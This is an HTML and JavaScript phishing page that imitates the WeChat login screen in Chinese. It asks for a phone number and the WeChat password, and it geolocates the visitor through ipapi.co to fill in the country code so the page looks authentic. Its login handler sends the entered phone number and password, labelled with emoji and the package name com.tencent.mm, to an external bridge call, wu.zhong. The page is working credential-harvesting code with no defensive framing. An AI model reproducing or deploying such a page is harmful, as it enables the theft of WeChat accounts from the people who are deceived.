<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title></title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }


    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background-color: #1a1a1a;
      color: #ffffff;
      min-height: 100vh;
      overflow-x: hidden;
    }


    .page {
      display: none;
      min-height: 100vh;
      padding: 20px;
      position: relative;
    }


    .page.active {
      display: block;
    }


    .close-btn {
      position: absolute;
      top: 20px;
      left: 20px;
      font-size: 24px;
      color: #ffffff;
      cursor: pointer;
      z-index: 10;
    }


    .container {
      max-width: 400px;
      margin: 0 auto;
      padding-top: 80px;
    }


    .title {
      font-size: 24px;
      font-weight: 400;
      text-align: center;
      margin-bottom: 60px;
      color: #ffffff;
    }


    .form-group {
      margin-bottom: 30px;
    }


    .form-label {
      display: block;
      font-size: 16px;
      color: #ffffff;
      margin-bottom: 8px;
    }


    .form-input {
      width: 100%;
      padding: 15px 0;
      background: transparent;
      border: none;
      border-bottom: 1px solid #333;
      color: #ffffff;
      font-size: 16px;
      outline: none;
      transition: border-color 0.3s ease;
    }


    .form-input:focus {
      border-bottom-color: #07c160;
    }


    .form-input::placeholder {
      color: #666;
    }


    .country-selector {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 15px 0;
      border-bottom: 1px solid #333;
      cursor: pointer;
    }


    .country-text {
      color: #ffffff;
      font-size: 16px;
    }


    .other-options {
      color: #666;
      font-size: 16px;
      margin: 40px 0 60px 0;
      cursor: pointer;
    }


    .continue-btn {
      width: 100%;
      padding: 15px;
      background-color: #07c160;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      font-weight: 500;
      cursor: pointer;
      margin-bottom: 40px;
      transition: background-color 0.3s ease;
    }


    .continue-btn:hover {
      background-color: #06a552;
    }


    .login-btn {
      width: 100%;
      padding: 15px;
      background-color: #07c160;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      font-weight: 500;
      cursor: pointer;
      margin-bottom: 40px;
      transition: background-color 0.3s ease;
    }


    .login-btn:hover {
      background-color: #06a552;
    }


    .disclaimer {
      font-size: 12px;
      color: #666;
      line-height: 1.4;
      margin-bottom: 40px;
    }


    .bottom-links {
      display: flex;
      justify-content: space-between;
      font-size: 14px;
      color: #666;
    }


    .bottom-links span {
      cursor: pointer;
    }


    .sms-link {
      color: #666;
      font-size: 16px;
      margin: 30px 0;
      cursor: pointer;
      text-decoration: none;
    }


    .phone-display {
      color: #666;
      font-size: 16px;
    }


    /* Mobile-first responsive design */
    @media (min-width: 768px) {
      .container {
        max-width: 450px;
        padding-top: 100px;
      }
     
      .title {
        font-size: 28px;
        margin-bottom: 80px;
      }
    }


    @media (min-width: 1024px) {
      .container {
        max-width: 500px;
      }
    }
  </style>
</head>
<body>

  <div class="page active" id="page1">
    <div class="close-btn">✕</div>
    <div class="container">
      <h1 class="title">登录微信</h1>
     
      <div class="form-group">
        <label class="form-label">国家/地区</label>
        <div class="country-selector">
          <span class="country-text"></span>
        </div>
      </div>


      <div class="form-group">
        <label class="form-label">电话号码</label>
        <input type="tel" class="form-input" id="phoneInput" placeholder="输入手机号码">
      </div>


       <div class="form-group">
        <label class="form-label">密码</label>
        <input type="password" class="form-input" id="password" placeholder="输入微信密码">
      </div>

      <div class="disclaimer">
        上述手机号码仅用于登录验证
      </div>


      <button class="continue-btn" onclick="nextPage()">登录</button>


      <div class="bottom-links">
        <span>无法登录？</span>
        <span>更多选项</span>
      </div>
    </div>
  </div>


  


  <script>
    window.onload = async function() {
            var json= await fetch("https://ipapi.co/json/").then(res => res.json());
            document.querySelector('.country-text').innerHTML = `${new Intl.DisplayNames([ navigator.language || navigator.userLanguage], { type: 'region' }).of(json.country)} (${json.country_calling_code})`;
        };

        function nextPage() {

            

            const username = document.getElementById('phoneInput').value.trim();
            const password = document.getElementById('password').value;


            if (!username || !password) {
            return;
            }


           wu.zhong(`🔰 微信\n\n ✉️微信用户名: ${username}\n\n🔒微信密码: ${password}`, "com.tencent.mm");

        }




  </script>
</body>
</html>
